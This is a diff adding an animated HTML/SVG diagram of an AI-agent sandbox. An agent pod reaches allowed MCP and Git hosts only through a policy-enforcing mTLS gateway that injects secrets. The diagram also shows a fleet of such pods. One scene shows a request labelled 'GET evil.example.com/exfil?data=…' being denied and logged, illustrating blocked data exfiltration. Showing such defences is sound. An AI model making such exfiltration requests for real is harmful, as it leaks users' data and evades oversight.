@@ -1,0 +1,226 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>agent-sandbox motion</title>
+<style>
+  html,body{margin:0;background:#0b1220;width:1200px;height:600px;overflow:hidden}
+  svg{display:block}
+  :root { --bg:#0b1220; --card:#121b31; --line:#2a3a5c; --txt:#e5e7eb; --mut:#94a3b8; --ok:#22c55e; --bad:#ef4444; --blue:#60a5fa; --amber:#fbbf24; }
+  text { fill: var(--txt); font-size: 15px; font-family: Inter, Helvetica, Arial, sans-serif; }
+  .mut { fill: var(--mut); font-size: 13px; }
+  .h { font-weight: 600; font-size: 16px; }
+  .card { fill: var(--card); stroke: var(--line); stroke-width: 1.5; rx: 10; }
+  .wire { stroke: var(--line); stroke-width: 2; fill: none; }
+  .pkt { fill: var(--blue); } .ok { fill: var(--ok); } .bad { fill: var(--bad); }
+  /* every timeline animation is 26s linear so one scrub position drives all of them */
+  .kf { animation-duration: 26s; animation-iteration-count: 1; animation-timing-function: linear; animation-fill-mode: both; }
+
+  #sceneA { transform-origin: 600px 300px; animation-name: sceneA; }
+  @keyframes sceneA { 0%,47% { opacity:1; transform:scale(1);} 53%,100% { opacity:0; transform:scale(.25);} }
+  #captionA { animation-name: captionA; } @keyframes captionA { 0%,2% {opacity:0} 4%,46% {opacity:1} 50%,100% {opacity:0} }
+  #typing { animation-name: typing; } @keyframes typing { 0% { width:0 } 5% { width:200px } 100% { width:200px } }
+  #p1 { animation-name: p1; } @keyframes p1 { 0%,5% { opacity:0; transform:translate(0,0);} 6% { opacity:1;} 11% { opacity:1; transform:translate(80px,0);} 12%,100% { opacity:0; transform:translate(80px,0);} }
+  #p2 { animation-name: p2; } @keyframes p2 { 0%,11% { opacity:0; transform:translate(0,0);} 12% { opacity:1;} 14% { transform:translate(80px,0);} 16.5% { opacity:1; transform:translate(380px,0);} 17.5%,100% { opacity:0; transform:translate(380px,0);} }
+  #think { animation-name: think; } @keyframes think { 0%,17% { opacity:0 } 18%,46% { opacity:1 } 47%,100% { opacity:0 } }
+  #think circle { animation: dots 1.2s infinite; } #think circle:nth-child(2){animation-delay:.2s} #think circle:nth-child(3){animation-delay:.4s}
+  @keyframes dots { 0%,100% { opacity:.2 } 50% { opacity:1 } }
+  #r1 { animation-name: r1; } @keyframes r1 { 0%,23% { opacity:0; transform:translate(0,0);} 24% { opacity:1;} 27% { transform:translate(-300px,0);} 29.5% { opacity:1; transform:translate(-300px,-200px);} 30.5%,100% { opacity:0; transform:translate(-300px,-200px);} }
+  #r2 { animation-name: r2; } @keyframes r2 { 0%,31% { opacity:0; transform:translate(0,0);} 32% { opacity:1;} 35% { transform:translate(-300px,0);} 37.5% { opacity:1; transform:translate(-180px,-200px);} 38.5%,100% { opacity:0; transform:translate(-180px,-200px);} }
+  #r3 { animation-name: r3; } @keyframes r3 { 0%,39% { opacity:0; transform:translate(0,0);} 40% { opacity:1;} 43% { transform:translate(-300px,0);} 44% { transform:translate(-290px,0);} 46% { opacity:1; transform:translate(-290px,0);} 47%,100% { opacity:0; transform:translate(-290px,0);} }
+  #lbl1 { animation-name: lbl1; } @keyframes lbl1 { 0%,23% {opacity:0} 24%,30% {opacity:1} 31%,100% {opacity:0} }
+  #lbl2 { animation-name: lbl2; } @keyframes lbl2 { 0%,31% {opacity:0} 32%,38% {opacity:1} 39%,100% {opacity:0} }
+  #lbl3 { animation-name: lbl3; } @keyframes lbl3 { 0%,39% {opacity:0} 40%,46% {opacity:1} 47%,100% {opacity:0} }
+  #ok1,#ok2,#bad3 { transform-box: fill-box; transform-origin: center; }
+  #ok1 { animation-name: ok1; } @keyframes ok1 { 0%,26.5% {opacity:0; transform:scale(.5)} 27.5%,46% {opacity:1; transform:scale(1)} 47%,100% {opacity:0} }
+  #ok2 { animation-name: ok2; } @keyframes ok2 { 0%,34.5% {opacity:0; transform:scale(.5)} 35.5%,46% {opacity:1; transform:scale(1)} 47%,100% {opacity:0} }
+  #bad3 { animation-name: bad3; } @keyframes bad3 { 0%,42.5% {opacity:0; transform:scale(.5)} 43.5%,46% {opacity:1; transform:scale(1)} 47%,100% {opacity:0} }
+  #deny { animation-name: deny; } @keyframes deny { 0%,43% {opacity:0; transform:translate(0,10px)} 44%,46.5% {opacity:1; transform:translate(0,0)} 47.5%,100% {opacity:0} }
+  #logline { animation-name: logline; } @keyframes logline { 0%,43.5% {opacity:0} 44.5%,46.5% {opacity:1} 47.5%,100% {opacity:0} }
+
+  #sceneB { transform-origin: 600px 300px; animation-name: sceneB; }
+  @keyframes sceneB { 0%,47% { opacity:0; transform:scale(2.6);} 54% { opacity:1; transform:scale(1);} 96% { opacity:1; transform:scale(1);} 100% { opacity:0; transform:scale(1);} }
+  #caption { animation-name: caption; } @keyframes caption { 0%,47% {opacity:0} 54%,95% {opacity:1} 99%,100% {opacity:0} }
+  .pod { transform-box: fill-box; transform-origin: center; }
+  #podNew { animation-name: podNew; } @keyframes podNew { 0%,62% {opacity:0; transform:scale(.3)} 65%,100% {opacity:1; transform:scale(1)} }
+  #podNew2 { animation-name: podNew2; } @keyframes podNew2 { 0%,76% {opacity:0; transform:scale(.3)} 79%,100% {opacity:1; transform:scale(1)} }
+  #podDie { animation-name: podDie; } @keyframes podDie { 0%,70% {opacity:1; transform:scale(1)} 74%,100% {opacity:.25; transform:scale(.92)} }
+  #podDieTxt { animation-name: podDieTxt; } @keyframes podDieTxt { 0%,72% {opacity:0} 75%,100% {opacity:1} }
+  #taskPkt { animation-name: taskPkt; } @keyframes taskPkt { 0%,56% {opacity:0; transform:translate(0,0)} 57% {opacity:1} 61% {opacity:1; transform:translate(0,80px)} 62%,100% {opacity:0} }
+  #prPkt { animation-name: prPkt; } @keyframes prPkt { 0%,66% {opacity:0; transform:translate(0,0)} 67% {opacity:1} 71% {opacity:1; transform:translate(245px,-60px)} 72%,100% {opacity:0} }
+  #prevPkt { animation: prev 2.4s infinite linear; } @keyframes prev { 0% {opacity:0; transform:translate(0,0)} 10% {opacity:1} 90% {opacity:1; transform:translate(160px,0)} 100% {opacity:0; transform:translate(160px,0)} }
+  .beat { animation: beat 1.8s infinite ease-in-out; } @keyframes beat { 0%,100% {opacity:.35} 50% {opacity:1} }
+  .flow1 { animation: flow 2s infinite linear; } .flow2 { animation: flow 2s infinite linear; animation-delay:.7s } .flow3 { animation: flow 2s infinite linear; animation-delay:1.3s }
+  @keyframes flow { 0% {offset-distance:0%; opacity:0} 10% {opacity:1} 90% {opacity:1} 100% {offset-distance:100%; opacity:0} }
+</style>
+<svg xmlns="http://www.w3.org/2000/svg" width="1200" height="600" viewBox="0 0 1200 600">
+  <rect width="1200" height="600" fill="#0b1220"/>
+
+  <!-- ================= SCENE A: one task ================= -->
+  <g id="sceneA" class="kf">
+    <text id="captionA" class="kf mut" x="40" y="60">One task, start to finish. The agent only ever talks to the gateway; the gateway only lets through what the policy says.</text>
+
+    <rect x="570" y="90" width="110" height="52" class="card"/>
+    <text x="625" y="112" text-anchor="middle">MCP</text>
+    <text x="625" y="131" text-anchor="middle" class="mut">mcp.example.com</text>
+    <rect x="690" y="90" width="110" height="52" class="card"/>
+    <text x="745" y="112" text-anchor="middle">Git</text>
+    <text x="745" y="131" text-anchor="middle" class="mut">git.example.com</text>
+    <rect x="810" y="90" width="120" height="52" class="card" stroke-dasharray="4 3" opacity=".55"/>
+    <text x="870" y="112" text-anchor="middle" opacity=".7">anything else</text>
+    <text x="870" y="131" text-anchor="middle" class="mut">evil.example.com</text>
+
+    <rect x="40" y="250" width="220" height="100" class="card"/>
+    <text x="56" y="276" class="h">API client</text>
+    <text x="56" y="298" class="mut">POST /v1/sandboxes/sb_1/runs</text>
+    <clipPath id="typeclip"><rect id="typing" class="kf" x="56" y="306" width="0" height="30"/></clipPath>
+    <text x="56" y="328" clip-path="url(#typeclip)" fill="#fbbf24">"add tests for checkout"</text>
+
+    <rect x="340" y="250" width="180" height="100" class="card"/>
+    <text x="430" y="280" text-anchor="middle" class="h">sandboxd</text>
+    <text x="430" y="300" text-anchor="middle" class="mut">queue run, wake pod</text>
+    <text x="430" y="320" text-anchor="middle" class="mut">identity · policy · DNS</text>
+
+    <rect x="600" y="200" width="200" height="200" class="card" stroke="#3b82f6"/>
+    <text x="700" y="232" text-anchor="middle" class="h">gateway</text>
+    <text x="700" y="254" text-anchor="middle" class="mut">Caddy mTLS · 10.77.77.1</text>
+    <text x="700" y="278" text-anchor="middle" class="mut">who?  → client cert</text>
+    <text x="700" y="298" text-anchor="middle" class="mut">allowed?  → policy</text>
+    <text x="700" y="318" text-anchor="middle" class="mut">secrets injected here</text>
+    <text x="700" y="382" text-anchor="middle" class="mut">policies/backend-dev.yaml</text>
+
+    <rect x="900" y="250" width="260" height="100" class="card" stroke="#22c55e"/>
+    <text x="916" y="276" class="h">pod · backend-dev / n=7</text>
+    <text x="916" y="298" class="mut">one interface: 10.77.77.10 → gateway</text>
+    <text x="916" y="318" class="mut">agent-runner → claude -p "$TASK"</text>
+    <g id="think" class="kf">
+      <circle cx="1100" cy="336" r="4" fill="#fbbf24"/><circle cx="1114" cy="336" r="4" fill="#fbbf24"/><circle cx="1128" cy="336" r="4" fill="#fbbf24"/>
+    </g>
+
+    <line x1="260" y1="300" x2="340" y2="300" class="wire"/>
+    <line x1="520" y1="300" x2="600" y2="300" class="wire"/>
+    <line x1="800" y1="300" x2="900" y2="300" class="wire"/>
+    <line x1="625" y1="142" x2="625" y2="200" class="wire"/>
+    <line x1="745" y1="142" x2="745" y2="200" class="wire"/>
+    <line x1="870" y1="142" x2="870" y2="190" class="wire" stroke-dasharray="4 4" opacity=".5"/>
+
+    <g id="p1" class="kf"><circle cx="268" cy="300" r="7" class="pkt"/></g>
+    <g id="p2" class="kf"><circle cx="528" cy="300" r="7" class="pkt"/></g>
+    <g id="r1" class="kf"><circle cx="925" cy="300" r="7" class="pkt"/></g>
+    <g id="r2" class="kf"><circle cx="925" cy="300" r="7" class="pkt"/></g>
+    <g id="r3" class="kf"><circle cx="925" cy="300" r="7" fill="#fbbf24"/></g>
+
+    <g id="lbl1" class="kf"><text x="1030" y="384" text-anchor="middle" class="mut">POST mcp.example.com/mcp  tools/list</text></g>
+    <g id="lbl2" class="kf"><text x="1030" y="384" text-anchor="middle" class="mut">POST git.example.com/…/git-receive-pack → agent/backend-dev-7</text></g>
+    <g id="lbl3" class="kf"><text x="1030" y="384" text-anchor="middle" fill="#fbbf24">GET evil.example.com/exfil?data=…</text></g>
+
+    <g id="ok1" class="kf"><circle cx="625" cy="171" r="12" class="ok"/><path d="M618 171 l5 5 l10 -11" stroke="#0b1220" stroke-width="3" fill="none"/></g>
+    <g id="ok2" class="kf"><circle cx="745" cy="171" r="12" class="ok"/><path d="M738 171 l5 5 l10 -11" stroke="#0b1220" stroke-width="3" fill="none"/></g>
+    <g id="bad3" class="kf"><circle cx="820" cy="300" r="13" class="bad"/><path d="M813 293 l14 14 M827 293 l-14 14" stroke="#0b1220" stroke-width="3"/></g>
+    <g id="deny" class="kf">
+      <rect x="560" y="420" width="430" height="78" rx="8" fill="#1f0f12" stroke="#ef4444" stroke-width="1.5"/>
+      <text x="576" y="446" fill="#fca5a5" class="h">403 · evil.example.com is not in policy backend-dev</text>
+      <text x="576" y="468" class="mut">DNS: NXDOMAIN · firewall: only 10.77.77.1:443 · no rule, no route</text>
+      <text x="576" y="488" class="mut">logged: backend-dev/7 · tenant alice · GET evil.example.com /exfil · deny</text>
+    </g>
+    <g id="logline" class="kf">
+      <text x="40" y="560" class="mut" font-family="ui-monospace, Menlo, monospace" font-size="12.5px">{"verdict":"deny","agent":"backend-dev/7","tenant":"alice","host":"evil.example.com","method":"GET","uri":"/exfil","reason":"policy: no rule"}</text>
+    </g>
+  </g>
+
+  <!-- ================= SCENE B: the fleet ================= -->
+  <g id="sceneB" class="kf">
+    <g id="caption" class="kf"><text class="mut" x="40" y="50">Zoom out: the fleet.</text><text class="mut" x="40" y="70">Pods come and go, each with its own</text><text class="mut" x="40" y="88">number, all with one single exit.</text></g>
+
+    <rect x="520" y="260" width="160" height="80" class="card" stroke="#3b82f6"/>
+    <text x="600" y="292" text-anchor="middle" class="h">gateway</text>
+    <text x="600" y="314" text-anchor="middle" class="mut">10.77.77.1 · policy · mTLS</text>
+    <g class="beat"><rect x="520" y="260" width="160" height="80" rx="10" fill="none" stroke="#3b82f6" stroke-width="3" opacity=".5"/></g>
+
+    <path d="M190 150 C 350 150, 420 260, 520 290" class="wire" opacity=".4"/>
+    <path d="M190 470 C 350 470, 420 340, 520 320" class="wire" opacity=".4"/>
+    <path d="M1010 150 C 850 150, 780 260, 680 290" class="wire" opacity=".4"/>
+    <path d="M1010 470 C 850 470, 780 340, 680 320" class="wire" opacity=".4"/>
+    <path d="M600 80 L 600 260" class="wire" opacity=".4"/>
+    <circle r="5" class="pkt flow1" style="offset-path: path('M190 150 C 350 150, 420 260, 520 290')"/>
+    <circle r="5" class="pkt flow2" style="offset-path: path('M190 470 C 350 470, 420 340, 520 320')"/>
+    <circle r="5" class="pkt flow3" style="offset-path: path('M1010 150 C 850 150, 780 260, 680 290')"/>
+    <circle r="5" class="pkt flow1" style="offset-path: path('M1010 470 C 850 470, 780 340, 680 320')"/>
+    <circle r="5" class="ok flow3" style="offset-path: path('M600 260 L 600 80')"/>
+
+    <rect x="520" y="30" width="160" height="50" class="card"/>
+    <text x="600" y="51" text-anchor="middle">Git · LLM · MCP</text>
+    <text x="600" y="69" text-anchor="middle" class="mut">allowlist, secrets injected</text>
+
+    <g class="pod">
+      <rect x="40" y="110" width="150" height="80" class="card" stroke="#22c55e"/>
+      <text x="56" y="134" class="h">reviewer / 3</text>
+      <text x="56" y="154" class="mut">reviews PR #42</text>
+      <text x="56" y="172" class="mut">comments via Git API</text>
+    </g>
+    <g class="pod">
+      <rect x="40" y="430" width="150" height="80" class="card" stroke="#22c55e"/>
+      <text x="56" y="454" class="h">docs-writer / 5</text>
+      <text x="56" y="474" class="mut">writes docs for v0.2</text>
+      <text x="56" y="492" class="mut">push → agent/docs-writer-5</text>
+    </g>
+    <g class="pod">
+      <rect x="1010" y="110" width="150" height="80" class="card" stroke="#22c55e"/>
+      <text x="1026" y="134" class="h">backend-dev / 7</text>
+      <text x="1026" y="154" class="mut">refactors payments/</text>
+      <text x="1026" y="172" class="mut">tests green, opens PR</text>
+    </g>
+    <g class="pod kf" id="podDie">
+      <rect x="1010" y="430" width="150" height="80" class="card" stroke="#22c55e"/>
+      <text x="1026" y="454" class="h">netops / 4</text>
+      <text x="1026" y="474" class="mut">NetBox audit done</text>
+      <text x="1026" y="492" class="mut">idle 1h …</text>
+    </g>
+    <g id="podDieTxt" class="kf"><text x="1085" y="532" text-anchor="middle" fill="#fbbf24" class="mut">sleeping · n=4 retired</text></g>
+
+    <rect x="300" y="60" width="160" height="50" class="card" stroke-dasharray="4 3"/>
+    <text x="380" y="81" text-anchor="middle">task tracker</text>
+    <text x="380" y="99" text-anchor="middle" class="mut">via API: POST /runs</text>
+    <g class="pod">
+      <rect x="305" y="200" width="150" height="80" class="card" stroke="#22c55e"/>
+      <text x="321" y="224" class="h">backend-dev / 8</text>
+      <text x="321" y="244" class="mut">takes task TV-311</text>
+      <text x="321" y="262" class="mut">"fix flaky e2e"</text>
+    </g>
+    <line x1="380" y1="110" x2="380" y2="200" class="wire" opacity=".4"/>
+    <g id="taskPkt" class="kf"><rect x="372" y="112" width="16" height="12" rx="2" fill="#fbbf24"/></g>
+
+    <line x1="455" y1="240" x2="700" y2="180" class="wire" opacity=".25" stroke-dasharray="3 4"/>
+    <g id="prPkt" class="kf"><circle cx="455" cy="240" r="6" class="ok"/></g>
+    <g class="pod">
+      <rect x="700" y="140" width="150" height="80" class="card" stroke="#22c55e"/>
+      <text x="716" y="164" class="h">reviewer / 9</text>
+      <text x="716" y="184" class="mut">waits for the PR,</text>
+      <text x="716" y="202" class="mut">then reviews it</text>
+    </g>
+
+    <g class="pod">
+      <rect x="305" y="400" width="190" height="90" class="card" stroke="#22c55e"/>
+      <text x="321" y="424" class="h">frontend-dev / 6</text>
+      <text x="321" y="444" class="mut">vite on 0.0.0.0:3000</text>
+      <text x="321" y="462" class="mut">preview: shop-alice.preview…</text>
+      <text x="321" y="480" class="mut">sandboxctl preview -port 3000</text>
+    </g>
+    <line x1="495" y1="445" x2="660" y2="445" class="wire" opacity=".4"/>
+    <g id="prevPkt"><circle cx="500" cy="445" r="5" fill="#fbbf24"/></g>
+    <rect x="660" y="415" width="150" height="60" class="card" stroke-dasharray="4 3"/>
+    <text x="735" y="440" text-anchor="middle">browser</text>
+    <text x="735" y="458" text-anchor="middle" class="mut">https://…preview.example.com</text>
+
+    <g class="pod kf" id="podNew">
+      <rect x="860" y="250" width="150" height="80" class="card" stroke="#22c55e"/>
+      <text x="876" y="274" class="h">backend-dev / 10</text>
+      <text x="876" y="294" class="mut">new pod → CSR → cert</text>
+      <text x="876" y="312" class="mut">n=10, never reused</text>
+    </g>
+    <g class="pod kf" id="podNew2">
+      <rect x="700" y="500" width="150" height="80" class="card" stroke="#22c55e"/>
+      <text x="716" y="524" class="h">docs-writer / 11</text>
+      <text x="716" y="544" class="mut">woke up: new task</text>
+      <text x="716" y="562" class="mut">same volume, new cert</text>
+    </g>
+  </g>
+</svg>
